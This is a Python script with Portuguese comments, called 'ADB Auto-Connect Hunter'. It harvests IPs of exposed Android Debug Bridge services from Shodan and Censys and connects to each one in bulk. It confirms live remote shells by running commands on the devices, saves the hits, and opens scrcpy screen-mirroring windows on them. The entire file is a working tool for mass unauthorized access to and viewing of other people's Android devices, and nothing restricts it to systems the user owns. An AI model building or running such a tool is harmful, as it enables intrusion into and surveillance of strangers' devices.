#!/usr/bin/env python3
import argparse
import base64
import json
import shutil
import subprocess
import sys
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed

# Queries padrão para encontrar dispositivos ADB expostos
DEFAULT_SHODAN_QUERY = "Android Debug Bridge port:5555"
DEFAULT_CENSYS_QUERY = "services.port=5555 and services.service_name=ADB"

def check_adb_connection(ip, port):
    """
    Usa o binário adb do sistema para tentar conectar e verificar o status.
    """
    target = f"{ip}:{port}"
    try:
        # Tenta conectar ao dispositivo
        subprocess.run(["adb", "connect", target],
                       capture_output=True, timeout=5)

        # Verifica se o dispositivo aparece como 'device' (conectado)
        # e não como 'offline', 'unauthorized' ou ausente
        result = subprocess.run(["adb", "devices"],
                                capture_output=True, text=True, timeout=5)

        if f"{target}\tdevice" in result.stdout:
            return ip, True
    except Exception:
        pass
    return ip, False

def check_live_shell(ip, port):
    """
    Conecta e confirma que o shell ADB realmente RESPONDE.
    Descarta 'offline', 'unauthorized' e os famosos 'error: closed':
    só retorna True se um comando de shell executar de verdade.
    """
    target = f"{ip}:{port}"
    try:
        subprocess.run(["adb", "connect", target],
                       capture_output=True, timeout=5)

        # Executa um comando real no dispositivo-alvo. Se o shell estiver
        # morto/fechado, o returncode != 0 e o marcador não volta.
        result = subprocess.run(
            ["adb", "-s", target, "shell", "echo", "__ADBOK__"],
            capture_output=True, text=True, timeout=8)

        if result.returncode == 0 and "__ADBOK__" in result.stdout:
            return ip, True
    except Exception:
        pass
    return ip, False

def fetch_shodan(api_key, query, limit):
    """
    Busca hosts no Shodan usando a API key informada.
    Retorna uma lista de IPs (string).
    """
    url = "https://api.shodan.io/shodan/host/search?" + urllib.parse.urlencode(
        {"key": api_key, "query": query})
    try:
        with urllib.request.urlopen(url, timeout=30) as r:
            data = json.load(r)
        ips = [m["ip_str"] for m in data.get("matches", []) if m.get("ip_str")]
        ips = ips[:limit]
        print(f"[i] Shodan: {len(ips)} hosts para '{query}'")
        return ips
    except Exception as e:
        print(f"[!] Erro na consulta Shodan: {e}")
        return []

def fetch_censys(api_id, secret, query, limit):
    """
    Busca hosts no Censys (API v2 Hosts) com as credenciais informadas.
    Retorna uma lista de IPs (string).
    """
    url = "https://search.censys.io/api/v2/hosts/search?" + urllib.parse.urlencode(
        {"q": query, "per_page": min(limit, 100)})
    auth = base64.b64encode(f"{api_id}:{secret}".encode()).decode()
    req = urllib.request.Request(url, headers={"Authorization": f"Basic {auth}"})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            data = json.load(r)
        hits = data.get("result", {}).get("hits", [])
        ips = [h["ip"] for h in hits if h.get("ip")]
        ips = ips[:limit]
        print(f"[i] Censys: {len(ips)} hosts para '{query}'")
        return ips
    except Exception as e:
        print(f"[!] Erro na consulta Censys: {e}")
        return []

def load_from_file(path):
    """Lê IPs de um arquivo (um por linha, '#' ignora a linha)."""
    try:
        with open(path, "r") as f:
            return [line.strip() for line in f
                    if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        sys.exit(f"[!] Arquivo {path} não encontrado.")

def launch_scrcpy(targets):
    """
    Abre uma janela do scrcpy (sem áudio) para cada alvo confirmado.
    Processos são lançados em segundo plano, sem travar o fluxo.
    """
    if not shutil.which("scrcpy"):
        print("[!] scrcpy nao encontrado no PATH; pulando visualizacao.")
        return
    for target in targets:
        print(f"[>] Abrindo scrcpy para {target}")
        try:
            subprocess.Popen(
                ["scrcpy", "-s", target, "--no-audio"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            print(f"[!] Falha ao abrir scrcpy para {target}: {e}")

def main():
    ap = argparse.ArgumentParser(description="ADB Auto-Connect Hunter")
    ap.add_argument("-f", "--file", help="Arquivo com IPs (um por linha)")
    ap.add_argument("--shodan", metavar="API_KEY",
                    help="Buscar alvos no Shodan usando esta API key "
                         f"(query padrão: '{DEFAULT_SHODAN_QUERY}')")
    ap.add_argument("--censys", metavar="ID:SECRET",
                    help="Buscar alvos no Censys usando 'api_id:secret' "
                         f"(query padrão: '{DEFAULT_CENSYS_QUERY}')")
    ap.add_argument("--query", help="Sobrescreve a query padrão usada nas APIs")
    ap.add_argument("--limit", type=int, default=100,
                    help="Máximo de hosts por fonte de API (padrão 100)")
    ap.add_argument("-p", "--port", type=int, default=5555, help="Porta ADB (padrão 5555)")
    ap.add_argument("-w", "--workers", type=int, default=20, help="Threads paralelas")
    ap.add_argument("-o", "--output", help="Salvar IPs confirmados em arquivo")
    ap.add_argument("-s", "--shell", action="store_true",
                    help="Confirmar apenas shells vivos (descarta 'error: closed')")
    ap.add_argument("--scrcpy", action="store_true",
                    help="Abrir scrcpy (--no-audio) para cada dispositivo confirmado")
    args = ap.parse_args()

    ips = []
    if args.file:
        ips += load_from_file(args.file)
    if args.shodan:
        ips += fetch_shodan(args.shodan, args.query or DEFAULT_SHODAN_QUERY, args.limit)
    if args.censys:
        api_id, sep, secret = args.censys.partition(":")
        if not (api_id and sep and secret):
            sys.exit("[!] Formato invalido para --censys. Use 'api_id:secret'.")
        ips += fetch_censys(api_id, secret, args.query or DEFAULT_CENSYS_QUERY, args.limit)

    if not ips:
        sys.exit("[!] Nenhuma fonte de IPs. Use -f, --shodan ou --censys.")

    ips = list(dict.fromkeys(ips))
    checker = check_live_shell if args.shell else check_adb_connection
    modo = "shell vivo" if args.shell else "conexao"
    print(f"[*] Testando {len(ips)} IPs na porta {args.port} com {args.workers} threads (modo: {modo})...")

    found = []
    with ThreadPoolExecutor(max_workers=args.workers) as pool:
        futures = [pool.submit(checker, ip, args.port) for ip in ips]
        for future in as_completed(futures):
            ip, ok = future.result()
            if ok:
                print(f"[+] CONFIRMADO: {ip}:{args.port}")
                found.append(ip)

    print(f"\n[✓] Total de dispositivos acessiveis: {len(found)}")

    if found and args.output:
        with open(args.output, "w") as f:
            for ip in found:
                f.write(f"{ip}:{args.port}\n")
        print(f"[i] Resultados salvos em {args.output}")

    if found and args.scrcpy:
        launch_scrcpy([f"{ip}:{args.port}" for ip in found])

if __name__ == "__main__":
    main()
